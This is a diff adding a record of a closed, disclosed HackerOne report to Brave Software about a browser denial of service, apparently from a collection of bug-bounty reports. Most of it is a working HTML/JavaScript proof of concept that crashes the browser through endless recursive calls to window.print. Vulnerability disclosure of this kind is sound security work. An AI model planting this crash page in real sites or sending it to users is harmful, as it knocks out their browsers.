@@ -1,0 +1,32 @@
+ReportLink:https://hackerone.com/reports/181061
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/konduru-jashwanth
+ReportedTo:Brave Software(brave)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:10.08.2017 5:11:04
+
+Summary:
+
+Allows remote attackers to cause a denial of service (application crash) resulting in stack overflow via nested calls to the window.print javascript function.
+
+<html>
+<title>Remote Stack Overflow DoS PoC</title>
+<body bgcolor="#50708C">
+<center>
+<p><font color="#e3e3e3">Remote Stack Overflow DoS PoC</font></p>
+<button onClick=crash()>Execute!</button>
+</center>
+<script>
+function crash(){
+window.print();
+crash();
+}
+</script>
+</body>
+</html>
+
+Poc : Please find attached file POC Video
+
+Reference Link : https://www.exploit-db.com/exploits/33951/
